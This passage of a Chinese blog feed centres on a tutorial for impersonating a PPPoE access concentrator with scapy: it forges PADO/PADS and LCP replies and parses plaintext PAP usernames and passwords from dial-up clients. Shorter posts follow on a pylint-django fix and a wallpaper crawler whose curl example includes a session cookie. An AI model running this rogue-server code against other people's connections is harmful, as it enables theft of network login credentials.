<p>PADO分组必须包含一个接入集中器名称类型的标签（此处的标签类型字段值为 akkuman），其实就是一个名字，你想填什么都可以。</p>
<p>并且需要包含前面 PADI 包中的 Host-Uniq 字段，这个字段在 PPPoE 的发现阶段都是必要的。</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/PADO_TIM_20190512203433.png" alt=""></p>
<p>在载荷中可能有多个 tag，他们的格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|          TAG_TYPE             |        TAG_LENGTH             |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|          TAG_VALUE ...                                        ~</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
<p>可以看出，标记的封装格式采用的是大家所熟知的TLV结构，也即是（类型+长度+数据）。标记的类型域为2个字节，各个标记的类型所代表的含义具体可以查看 <a href="https://datatracker.ietf.org/doc/rfc2516/" target="_blank" rel="noopener">RFC 2516</a> 或 <a href="https://datatracker.ietf.org/doc/rfc2516/" target="_blank" rel="noopener">PPPoE帧格式</a></p>
<p>这里的 0x0103 即代表 Host-Uniq，是主机唯一标识，作用在上文已经提及。</p>
<p>那我们可以根据这个要求写一个发送 PADO 包的函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#发送PADO回执包</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_pado_packet</span><span class="params">(self, pkt)</span>:</span></span><br><span class="line">    <span class="comment"># 寻找客户端的Host_Uniq</span></span><br><span class="line">    _host_Uniq = self.padi_find_hostuniq(pkt.payload)</span><br><span class="line">    _payload = <span class="string">b'\x01\x02\x00\x07akkuman\x01\x01\x00\x00'</span></span><br><span class="line">    <span class="keyword">if</span> _host_Uniq:</span><br><span class="line">        _payload += _host_Uniq</span><br><span class="line">    <span class="comment"># PADO 回执包的 sessoinid 为 0x0000</span></span><br><span class="line">    pkt.sessionid =  getattr(pkt, <span class="string">'sessionid'</span>, <span class="number">0x0000</span>)</span><br><span class="line">    sendpkt = Ether(src=MAC_ADDRESS, dst=pkt.src, type=<span class="number">0x8863</span>) / PPPoED(version=<span class="number">1</span>, type=<span class="number">1</span>, code=<span class="number">0x07</span>, sessionid=pkt.sessionid, len=len(_payload)) / _payload</span><br><span class="line">    scapy.sendp(sendpkt)</span><br></pre></td></tr></table></figure>
<p>其中的 pkt 是接收到的 PADI 数据包。</p>
<p>上面的 _payload 中的 \x01\x02 代表是 AC-Name 字段，\x00\x07 是后面的 akkuman 的长度。\x01\x01 是代表 Service-Name 字段，一般为空，所以我们这里直接填 \x00\x00。下文不再赘述。</p>
<p>其中的源 mac 地址和目标 mac 地址我们需要改改。</p>
<p>然后加上 Host-Uniq 字段，封装成包发出去，注意这里的 type=0x8863 是代表发现阶段，0x8864 是会话阶段。</p>
<p>至于这个是怎么封装起来的，这个是 scapy 库的语法，Ether 代表链路层，剩下的依此大家参照图即可理解，最后的 _payload 代表接上一段原始数据，一般就是 bytes。</p>
<h3 id="PADR"><a href="#PADR" class="headerlink" title="PADR"></a>PADR</h3><p>因为 PADI 包是广播的，所以客户端有可能收到不同的接入集中器多个的 PADO 响应包，客户端应该基于 AC-Name 和可以提供的服务（这个参见 RFC2516）从中选择一个合适的接入集中器。</p>
<p>然后客户端就发送 PADR 包到自己选择的接入集中器（将目标 mac 改成 PADO 包中的源 mac 即可），其中 CODE 字段为 0×19，SESSION_ID 字段值仍为 0×0000。</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/PADR_TIM_20190512205952.png" alt=""></p>
<h3 id="PADS"><a href="#PADS" class="headerlink" title="PADS"></a>PADS</h3><p>当接入集中器收到一个 PADR 包以后，就要准备开始一个 PPP 会话了。</p>
<p>在这个阶段，接入集中器会为接下来的 PPPoE 会话生成一个独一无二的 SESSION_ID，然后组装起来进行发送。其中 CODE 字段值为 0×65 。</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/PADS_TIM_20190512210604.png" alt=""></p>
<p>根据此我们可以写出一个发送 PADS 包的函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#发送PADS回执包</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_pads_packet</span><span class="params">(self, pkt)</span>:</span></span><br><span class="line">    <span class="comment">#寻找客户端的Host_Uniq</span></span><br><span class="line">    _host_Uniq = self.padi_find_hostuniq(pkt.payload)</span><br><span class="line">    _payload = <span class="string">b'\x01\x01\x00\x00'</span></span><br><span class="line">    <span class="keyword">if</span> _host_Uniq:</span><br><span class="line">        _payload += _host_Uniq</span><br><span class="line"></span><br><span class="line">    pkt.sessionid =  SESSION_ID</span><br><span class="line">    sendpkt = Ether(src=MAC_ADDRESS, dst=pkt.src, type=<span class="number">0x8863</span>) / PPPoED(version=<span class="number">1</span>, type=<span class="number">1</span>, code=<span class="number">0x65</span>, sessionid=pkt.sessionid, len=len(_payload)) / _payload</span><br><span class="line">    scapy.sendp(sendpkt)</span><br></pre></td></tr></table></figure>
<p>其中的 pkt 为接收到的 PADR 数据包。</p>
<p>此时发现阶段就已经完成了，接下来就是进行 PPPoE 的会话阶段了。</p>
<h2 id="PPPoE-会话阶段"><a href="#PPPoE-会话阶段" class="headerlink" title="PPPoE 会话阶段"></a>PPPoE 会话阶段</h2><p>PPPoE 会话阶段的抓包并没有那么明显的特征，可能你在不同的时间看到的包的顺序都不太一样。</p>
<p>在此阶段的 Type 为 0x8864，代表 PPPoES，即会话阶段。</p>
<h3 id="LCP链路配置建立"><a href="#LCP链路配置建立" class="headerlink" title="LCP链路配置建立"></a>LCP链路配置建立</h3><p>一个典型的 LCP Request 如下图所示。</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/LCP_REQ_TIM_20190512211932.png" alt=""></p>
<p>Protocol：决定了后面的载荷包含的是什么样的协议报文，类似以太帧的类型字段，是用以区分载荷送给哪个上层协议处理。收下为常见协议号：</p>
<ul>
<li>0xC021: LCP报文</li>
<li>0xC023: Password Authentication Protocol （PAP）</li>
<li>0xC223: Challenge Handshake Authentication Protocol （CHAP）</li>
<li>0x8021: IPCP报文，它是NCP协议的一种 （用来协商分配 ip）</li>
<li>0x0021: IP报文</li>
</ul>
<p>LCP(Link Control Protocol) 是链路控制协议，是 PPP 协议的一个成员协议，PPP 协议在 LCP 阶段默认不做认证协商，LCP 的认证只作为一个可选的参数。</p>
<p>接入集中器和客户端双方通过交互LCP配置报文来协商数据链路。</p>
<p>协商内容包括验证方式、最大接收单元 MRU、魔术字（Magic Number）等选项。<br>在此阶段 LCP 的状态机发生两次改变，进入会话阶段后，检测到链路可用，则物理层会向链路层发送一个 UP 事件，链路层收到该事件后，会将LCP的状态机从当前状态改变为 Request-Sent（请求发送）状态。<br>LCP 开始发送 Config-Request 报文（即上图中 LCP 下面的 CODE 字段，为 1 代表 Config-Request）来协商数据链路，无论哪一端接收到了 Config-Ack 报文（LCP 的 CODE 字段为 2）时， LCP的状态机又要发生改变，从当前状态改变为 Opened 状态，进入 Opened 状态后收到 Config-Ack 报文的一方则完成了当前阶段，应该向下一个阶段跃迁，下一个阶段可能是 Authentication（如 PAP 或 CHAP），也可能是 Network Layer Protocol（NLP）。<br>同理可知，另一端也是一样的，但须注意的一点是在链路配置阶段双方是链路配置操作过程是相互独立的。</p>
<p>如果配置了验证，将进入Authentication阶段，CHAP 或 PAP 验证。如果没有配置验证，则直接进入 Network Layer Protocol 阶段，即开始分配 ip 等操作。</p>
<p>这是在网上找的 LCP 报文格式，其实更建议大家配合 wireshark 抓包来看。</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/LCP_Packet_format.png" alt=""></p>
<p>上面我的提到了 LCP 中的 code，LCP协议使用Code字段区分11种报文格式，详细的表见下，平时我们用的比较多的就是 1 和 2</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/LCP_code_table.png" alt=""></p>
<ul>
<li><p>Identifier：标识域的值表示进行协商报文的匹配关系。 标识域目的是用来匹配请求和响应报文。当对端接收到该配置请求报文后，无论使用何种报文回应对方，但必须要求回应报文中的ID要与接收报文中的ID一致。换句话说，在一个协商数据链路阶段，这个字段的值都是一样的，在本次我的例子抓包中为 1。</p>
</li>
<li><p>Length：它是代码域Code、标志域Identified、长度域Length和数据域Data四个域长度的总和。</p>
</li>
</ul>
<p>下面是一张图，用来说明 req 与 ack 的交互。</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/Link_Establishment.jpg" alt=""></p>
<p>从这张图中可以相信不难理解之前的话了，A 和 B 初始都在 Request-Sent（请求发送）状态。<br>然后两者都开始发送 Config-Request 报文，只有 A 和 B 都收到了对方的 Config-Ack 报文。<br>才标志着 LCP 状态变迁的完成，可以向下一个阶段 NLP 或者 Autiontication（PAP 或 CHAP）跃迁。</p>
<p>在协商数据链路配置阶段，点对点（PPPoE是点对点协议）双方至少都发了一个 Config-Request 报文，该报文中包含了发送方对于所有的配置参数的期望值。</p>
<p>关于在协商数据链路配置阶段可能出现的报文，我给大家找了一页 PPT</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/LCP_Configuration_Packet_20190512220257.png" alt=""></p>
<ul>
<li>如果对方对于自己发送的 Config-Request 回应了一个 Config-Ack，则说明对方能识别所有选项，并且全部能够被接受；</li>
<li>如果对方对于自己发送的 Config-Request 回应了一个 Config-Nak，则说明对方能识别所有选项，但只有部分能够被接受；</li>
<li>如果对方对于自己发送的 Config-Request 回应了一个 Config-Rej，则说明对方有部分选项不能被识别，或者不能被接受；</li>
<li>如果双方最终收到对方发送的 Config-Ack 报文，则说明对方对于自己提出的配置参数的协商已经取得了一致，这同时也标志着链路建立顺利结束。</li>
</ul>
<p>如果接收到了 Config-Nak 或者 Config-Rej，这也就意味着自己必须修改相应配置参数的期望值，然后向对方重新发送一个Config-Request报文，且等待对方新的回应。</p>
<p>但是就我抓到的过程中，没看见过在这个阶段有 Config-Nak 的出现。</p>
<p>有了上面的基础，我们再来看我的抓包历史记录</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/Packet_LCP_History_20190512221121.png" alt=""></p>
<p>其实大多不用管，只需要知道收到一个 Config-Request 得回一个 Config-Ack，并且自己也得发一个 Config-Request，并等待接收到对方的 Config-Ack。</p>
<p>但是我抓了好几次包，测试了不少次，发现一般情况下，一方在第一次接收到对方的 Config-Request 报文时会回应一个 Config-Rej。后续才开始对接收到的 Config-Request 回应 Config-Ack。</p>
<p>据此我们可以写出代码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#处理 PPP LCP 请求</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_lcp</span><span class="params">(self, pkt)</span>:</span></span><br><span class="line">    <span class="comment"># 初始化 clientMap</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> self.clientMap.get(pkt.src):</span><br><span class="line">        self.clientMap[pkt.src] = &#123;<span class="string">"req"</span>: <span class="number">0</span>, <span class="string">"ack"</span>: <span class="number">0</span>&#125;</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 处理 LCP-Configuration-Req 请求</span></span><br><span class="line">    <span class="keyword">if</span> bytes(pkt.payload)[<span class="number">8</span>] == <span class="number">0x01</span>:</span><br><span class="line">        <span class="comment"># 第一次 LCP-Configuration-Req 请求返回 Rej 响应包</span></span><br><span class="line">        <span class="keyword">if</span> self.clientMap[pkt.src][<span class="string">'req'</span>] == <span class="number">0</span>:</span><br><span class="line">            self.clientMap[pkt.src][<span class="string">'req'</span>] += <span class="number">1</span></span><br><span class="line">            print(<span class="string">"第 %d 次收到LCP-Config-Req"</span> % self.clientMap[pkt.src][<span class="string">"req"</span>])</span><br><span class="line">            print(<span class="string">"处理Req请求，发送LCP-Config-Rej包"</span>)</span><br><span class="line">            self.send_lcp_reject_packet(pkt)</span><br><span class="line">            print(<span class="string">"发送LCP-Config-Req包"</span>)</span><br><span class="line">            self.send_lcp_req_packet(pkt)</span><br><span class="line">        <span class="comment"># 后面的 LCP-Configuration-Req 请求均返回 Ack 响应包</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.clientMap[pkt.src][<span class="string">'req'</span>] += <span class="number">1</span></span><br><span class="line">            print(<span class="string">"第 %d 次收到LCP-Config-Req"</span> % self.clientMap[pkt.src][<span class="string">"req"</span>])</span><br><span class="line">            print(<span class="string">"处理Req请求，发送LCP-Config-Ack包"</span>)</span><br><span class="line">            self.send_lcp_ack_packet(pkt)</span><br><span class="line">    <span class="comment"># 处理 LCP-Configuration-Rej 请求</span></span><br><span class="line">    <span class="keyword">elif</span> bytes(pkt.payload)[<span class="number">8</span>] == <span class="number">0x04</span>:</span><br><span class="line">        print(<span class="string">"处理Rej请求，发送LCP-Config-Req包"</span>)</span><br><span class="line">        self.send_lcp_req_packet(pkt)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 处理 LCP-Configuration-Ack 请求</span></span><br><span class="line">    <span class="keyword">elif</span> bytes(pkt.payload)[<span class="number">8</span>] == <span class="number">0x02</span>:</span><br><span class="line">        self.clientMap[pkt.src][<span class="string">'ack'</span>] += <span class="number">1</span></span><br><span class="line">        print(<span class="string">"第 %d 收到LCP-Config-Ack"</span> % self.clientMap[pkt.src][<span class="string">"ack"</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>clientMap 请无视，最开始是打算支持多个 client，并做记录使用，但是发现拦截根本不用实现这个。</p>
<p>其中的方法我们先不展开，到时候会给大家把所有代码放上来，根据方法名大家应该能猜到是用来干嘛的。</p>
<h3 id="Authentication-阶段"><a href="#Authentication-阶段" class="headerlink" title="Authentication 阶段"></a>Authentication 阶段</h3><p>链路建立起来后，应该向下一个阶段跃迁，下一个阶段一般是 Authentication。一般来说就只有 PAP 和 CHAP。</p>
<p>CHAP 在高校拨号客户端中使用还并不算多，大多采用 PAP，所以 CHAP 我们暂且按下不表，相信要是你能看完这篇文章并自己动手实践的话，CHAP 的分析对你来说也是手到擒来。</p>
<p>在这里我们主要介绍 PAP 认证以及最最关键的环节：抓取账号密码。</p>
<p>PAP 的 Protocol 字段为 0xc023</p>
<p>PAP 包格式见下图</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/PPP_PAP_20190512225749.png" alt=""></p>
<p>从中我们可以看到 CODE 字段为 1，代表一个 Authentication-Request。前面我们说过了，Identifier 字段在链路建立阶段，这个字段的值是一样的，然后跃迁到下一阶段后，这个字段的值随着每个请求递增。</p>
<p>PAP 包的认证方式是由被认证端主动发起，被认证端发送明文口令至认证端，由对方认证。</p>
<p>PAP 并不能防止重放和穷举等攻击，而 CHAP 是由认证端主动发起（challenge 挑战），具体的安全提升大家可以自行查阅相关资料。</p>
<p>其中的 CODE 字段我们可以参见下表</p>
<table>
<thead>
<tr>
<th>CODE 值</th>
<th>报文名称</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>Authentication-Request</td>
</tr>
<tr>
<td>2</td>
<td>Authentication-Ack</td>
</tr>
<tr>
<td>3</td>
<td>Authentication-Nak</td>
</tr>
</tbody>
</table>
<p>我们所做的是拦截，所以我们只需要关心 Authentication-Request 的 Data 字段就好，Data 字段中，Peer-ID（用户名）字段，Password字段，它们都是明文的。</p>
<p>这里多说一点关于 Authentication-Ack 和 Authentication-Nak，如果认证成功，认证端会返回一个 Ack 并携带成功信息给被认证端，相反，认证失败会返回 Nak 并携带相关信息。</p>
<p>所以我们要做的就是在收到 Authentication-Request 包时解析出账号密码即可完成我们的小 demo 了。</p>
<p>代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解析pap账号密码</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_papinfo</span><span class="params">(self, pkt)</span>:</span></span><br><span class="line">    <span class="comment"># pap-req</span></span><br><span class="line">    _payLoad = bytes(pkt.payload)</span><br><span class="line">    <span class="keyword">if</span> _payLoad[<span class="number">8</span>] == <span class="number">0x01</span>:</span><br><span class="line">        _nUserLen = int(_payLoad[<span class="number">12</span>])</span><br><span class="line">        _nPassLen = int(_payLoad[<span class="number">13</span> + _nUserLen])</span><br><span class="line">        _userName = _payLoad[<span class="number">13</span>:<span class="number">13</span> + _nUserLen]</span><br><span class="line">        _passWord = _payLoad[<span class="number">14</span> + _nUserLen:<span class="number">14</span> + _nUserLen + _nPassLen]</span><br><span class="line">        print(<span class="string">"get User:%s,Pass:%s"</span> % (str(_userName), str(_passWord)))</span><br><span class="line">        <span class="comment">#self.send_pap_authreject(pkt)</span></span><br><span class="line">        <span class="keyword">if</span> pkt.src <span class="keyword">in</span> self.clientMap:</span><br><span class="line">            <span class="keyword">del</span> self.clientMap[pkt.src]</span><br><span class="line"></span><br><span class="line">        print(<span class="string">"欺骗完毕...."</span>)</span><br></pre></td></tr></table></figure>
<p>0x01 即代表 CODE 字段的 Authentication-Request。我们只需要从这个包里面按照抓包中的格式进行解析即可获取账号密码。</p>
<p>总体完成代码我会放在文章最后</p>
<h2 id="遇到的一些坑"><a href="#遇到的一些坑" class="headerlink" title="遇到的一些坑"></a>遇到的一些坑</h2><p>就算是一个并不算很困难的东西，但是在做这个东西的过程中还是遇到了不少坑，我在这里记录一下，免得后人和我一样踩坑。</p>
<p>最开始我想着因为都是本机搭建 client 和 server，那么我直接把链路层的 source 和 destination 的 mac 都设置为本机的物理网卡 mac，也就是全部采用第一个 PADI 包中的 source mac，但是我发现<br>除了最开始的 PADI 和 PADO，后面的包，用 wireshark 根本抓不到，我猜想是不是两个 mac 相同的原因，导致包被丢弃了 client 没收到，或者 client 本身接到这个包，但是发现两个 mac 相同。<br>于是不继续发送 PADR 了，这个原因我并不明白，可以完整捕获流程的只能是 server 搭建在虚拟机或者网关也就是路由器。这个结果让我十分沮丧。然后我采用了几种我能想到的办法，但是均不奏效。</p>
<ol>
<li>最容易想到的应该是伪造 server mac 了。但并不能抓到，我怀疑是没办法找到这个 mac，可能丢弃了，但是我不理解为什么就算找不到应该也会发个包吧，不至于抓包记录都没有。</li>
<li>我用工具搭建了一个TAP网卡，我用 wireshark 看了下，包的流经是先经过 TAP 网卡，然后 TAP 会作为一个二层交换机，修改源 mac 和目标 mac 后发往以太物理网卡，然后我采用 server 监听 TAP 网卡，发响应包采用物理网卡，但是依旧是后续进行不下去，虽说这两个mac不一样，但是 client 那边依旧没响应，不知道是 client 丢弃了这个包还是说 client 那边没收到。</li>
</ol>
<h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>当然这个问题到最后解决了，这里感谢一下老陈的指点。</p>
<p>其实比较简单，问题就是 npcap，毕竟 scapy 和 wireshark 都推荐这个，我也就采用了这个，但是就像前面所说的，就算伪造 mac，应该也会流经物理网卡，但是 npcap 本地发的包收不到client响应包。</p>
<p>所以采用 winpcap 就能正常了，包括两个 mac 相同也可以抓到。</p>
<p>至于这个具体是什么导致的，还是说是一个 bug，并不是太清楚。</p>
<h2 id="你还可以做哪些有趣的事情"><a href="#你还可以做哪些有趣的事情" class="headerlink" title="你还可以做哪些有趣的事情"></a>你还可以做哪些有趣的事情</h2><p>拦截以后，你可以自己配合自己的路由器进行拨号。</p>
<p>甚至大胆一点，你也可以尝试给客户端一个成功的 Authentication-Ack，看客户端会是什么效果，要是你继续模拟完整个流程，包括 IPCP，那么客户端会按照你的想法给你发送心跳包吗？</p>
<h2 id="代码地址"><a href="#代码地址" class="headerlink" title="代码地址"></a>代码地址</h2><p><a href="https://github.com/akkuman/pppoe-intercept" target="_blank" rel="noopener">PPPoE-Intercept</a></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://blog.sunflyer.cn/archives/460" target="_blank" rel="noopener">How To : 从Netkeeper 4.X客户端获取真实账号</a></li>
<li><a href="https://datatracker.ietf.org/doc/rfc2516/" target="_blank" rel="noopener">RFC 2516 - A Method for Transmitting PPP Over Ethernet (PPPoE)</a></li>
<li><a href="https://datatracker.ietf.org/doc/rfc1570/" target="_blank" rel="noopener">RFC 1570 - PPP LCP Extensions</a></li>
<li><a href="https://datatracker.ietf.org/doc/rfc1661/" target="_blank" rel="noopener">RFC 1661 - The Point-to-Point Protocol (PPP)</a></li>
<li><a href="https://wenku.baidu.com/view/e644ba4f33687e21af45a916" target="_blank" rel="noopener">点到点协议PPP-百度文库</a></li>
<li><a href="http://support.huawei.com/huaweiconnect/enterprise/huawei/m/ViewThread.html?tid=364813" target="_blank" rel="noopener">PPP（three P）基本原理</a></li>
<li><a href="https://github.com/Karblue/PPPoE-hijack" target="_blank" rel="noopener">PPPoE-hijack</a></li>
<li><a href="http://www.360doc.com/content/12/0312/20/3725126_193822217.shtml" target="_blank" rel="noopener">PPPoE工作原理以及PPPoE帧格式</a></li>
</ul>
<h2 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h2><p>感谢踩坑无助的时候<a href="https://blog.sunflyer.cn/" target="_blank" rel="noopener">老陈</a>的提点</p>
]]></content>
      <categories>
        <category>网络协议</category>
      </categories>
      <tags>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title>vscode打开django项目pylint提示has not "object" member</title>
    <url>/2019/04/28/vscode-django-pylint-error.html</url>
    <content><![CDATA[<p>vscode 打开 django 项目提示 has not “object” member 是因为 Django 动态地将属性添加到所有模型类中，所以 ide 无法解析。</p>
<a id="more"></a>
<p>解决方案：</p>
<ol>
<li>安装 pylint-django</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install -U pylint-django</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>启用 pylint-django</li>
</ol>
<p>打开项目下自动生成的 .vscode 文件夹下的 setting.json 文件，添加下面的配置项。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;python.linting.pylintArgs&quot;: [</span><br><span class="line">        &quot;--load-plugins=pylint_django&quot;</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>问题解决</category>
      </categories>
      <tags>
        <tag>问题解决</tag>
      </tags>
  </entry>
  <entry>
    <title>从客户端取到浏览器返回的oauth凭证</title>
    <url>/2019/04/26/get-auth-and-back-to-client.html</url>
    <content><![CDATA[<p>这个随便记录一下，也是朋友问我的一个问题。</p>
<p>在网上找了下，没找到相关的，用英文也搜索了一下，可能我的关键词没找对，找了一会没找到。</p>
<a id="more"></a>
<p>想到以前用过的rclone也是用的这样的方式，去看了下相关部分源码。</p>
<p>解决方案是本地搭建一个 webserver 用来获取凭证，然后客户端就能拿到了。</p>
]]></content>
      <categories>
        <category>问题解决</category>
      </categories>
      <tags>
        <tag>问题解决</tag>
      </tags>
  </entry>
  <entry>
    <title>打造一个壁纸爬虫来爬你的老婆</title>
    <url>/2019/03/13/wall-alphacoders-com-crawler.html</url>
    <content><![CDATA[<p>好久没写东西了，随便水一篇文，也是比较简单的东西</p>
<a id="more"></a>
<p>可能每个喜欢二次元的人都有自己的老婆或者老公吧，之前在朋友那里看到了一个壁纸网站<a href="https://wall.alphacoders.com" target="_blank" rel="noopener">wall.alphacoders.com</a>，要是我想要亚丝娜的壁纸，只需要搜索她的英文名<code>Asuna</code>即可看到一千多张有关亚丝娜的壁纸。壁纸收集爱好者肯定就和我一样想把它们给下载到自己的电脑上幻灯片当作壁纸了，当然手工下载是不可能的，必须写下爬虫，分析下壁纸下载流程。</p>
<h2 id="请求分析"><a href="#请求分析" class="headerlink" title="请求分析"></a>请求分析</h2><p>首先我们<code>F12</code>打开开发者工具，在一张图上找到下载</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1g11dqnaw51j20ac077777.jpg" alt=""></p>
<p>我们在开发者工具里面取元素，并没有看到下载链接，说明下载链接并没有包含在原始html中，但是点击是可以下载的，并且可以看到整个页面并没有进行刷新，判断是一个ajax请求，直接点进<code>XHR</code>，然后再次点击下载链接可以看到请求。</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1g11dw0idvpj212a0lwn62.jpg" alt=""></p>
<p>可以看到这个请求返回了一个链接，我们直接访问链接，发现是可以下载的，说明这就是下载链接了，那么这个链接是怎么来的呢？</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1g11dy25rizj20o30d5gme.jpg" alt=""></p>
<p>我们看看请求，这个post请求里面有一些参数，我们先不去考虑这些参数怎么来的，我们先模拟一下请求看看请求Header里面有没有什么东西是必须的，这里直接上<code>postman</code>或者<code>curl</code>都可以，如果你的机器上面安装了<code>curl</code>我推荐用这个，因为<code>Chrome</code>开发者工具，直接可以在请求上右键<code>Copy as cURL</code>，直接可以帮你复制出curl命令，我这里复制出来是这样的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl &quot;https://wall.alphacoders.com/get_download_link.php&quot; -H &quot;Pragma: no-cache&quot; -H &quot;Origin: https://wall.alphacoders.com&quot; -H &quot;Accept-Encoding: gzip, deflate, br&quot; -H &quot;Accept-Language: zh-CN,zh;q=0.9&quot; -H &quot;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36&quot; -H &quot;Content-Type: application/x-www-form-urlencoded; charset=UTF-8&quot; -H &quot;Accept: */*&quot; -H &quot;Cache-Control: no-cache&quot; -H &quot;X-Requested-With: XMLHttpRequest&quot; -H &quot;Cookie: __cfduid=d7ec945393d1b5ef3c28d4c9d12ef9fb11552315444; cookieconsent_status=allow; wa_session=1eogv8ehgn3itq5g4g8hfsducpkm9lbu46q893vrkhph3ued4rm89gvk7ck4fdg9k73cmrcdesoqj4crm1575vj3lfid9e67fpis661&quot; -H &quot;Connection: keep-alive&quot; -H &quot;Referer: https://wall.alphacoders.com/search.php?search=Asuna&quot; --data &quot;wallpaper_id=533007^&amp;type=png^&amp;server=images8^&amp;user_id=79150&quot; --compressed</span><br></pre></td></tr></table></figure>
<p>我们先去掉不必要的东西 <code>curl &quot;https://wall.alphacoders.com/get_download_link.php&quot; --data &quot;wallpaper_id=533007&amp;type=png&amp;server=images8&amp;user_id=79150&quot;</code> ，直接执行，发现可以获取到地址，所以现在要考虑的只有这些参数是怎么来的了，下面我同样放一张postman的图，可以看到是同样的可以获取到下载链接</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1g11e4cniksj20hq04lwek.jpg" alt=""><br><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1g11e7mv54sj20tx0cvgm5.jpg" alt=""></p>
<p>这些参数我们从两方面考虑，一是用js算出来的，一个就是在html中存在的。</p>
<p>我们首先在html里找找看有没有。</p>
<p>通过关键字搜索页面html，我们可以找到每一张图都有一串类似于下面的属性 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data-id=&quot;533007&quot; data-type=&quot;png&quot; data-server=&quot;images8&quot; data-user-id=&quot;79150&quot;</span><br></pre></td></tr></table></figure>
<p>和上面的post参数是一一对应的。</p>
<p>所以爬取思路就出来了。</p>
<p>访问一个页面，取到每一个图的特定属性，然后构造post请求得到下载地址，然后访问地址下载图片</p>
<p>那新问题是如果进行翻页并且判断是否到了最后一页。</p>
<p>我们可以发现页数是通过get的网址决定的，<code>https://wall.alphacoders.com/search.php?search=asuna&amp;page=10</code> ，更改<code>page</code>后面的值即可。</p>
<p>判断是否到了尾页，我们可以打开最后一页，然后查看一下html，我们可以看到<code>下一页</code>按钮的链接已经变成了 <code>&lt;a id=&#39;next_page&#39; href=&#39;#&#39;&gt;Next&amp;nbsp;&amp;#62;&lt;/a&gt;</code> ·，那我们就可以根据<code>href</code>的值是否为 <code>#</code> 来判断了。</p>
<h2 id="Python库的选择"><a href="#Python库的选择" class="headerlink" title="Python库的选择"></a>Python库的选择</h2><p>唯一用到的第三方库就是 <code>Requests</code> ，以前解析html的Dom树喜欢用<code>BeautifulSoup</code>，但是后来发现解析速度上确实和re有很大差距，并且当html有很特殊的字符时会又是莫名出错，故工程量不大的情况下，我现在还是优选正则。</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proxies = &#123; <span class="string">"http"</span>: <span class="string">"http://127.0.0.1:1080"</span>, <span class="string">"https"</span>: <span class="string">"http://127.0.0.1:1080"</span>, &#125;</span><br><span class="line"><span class="comment">#proxies = &#123;&#125;</span></span><br><span class="line">download_dir = <span class="string">'./pic/'</span></span><br><span class="line">downloaded_num = <span class="number">0</span></span><br><span class="line">total = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_pic</span><span class="params">(url, name, pic_type)</span>:</span></span><br><span class="line">    <span 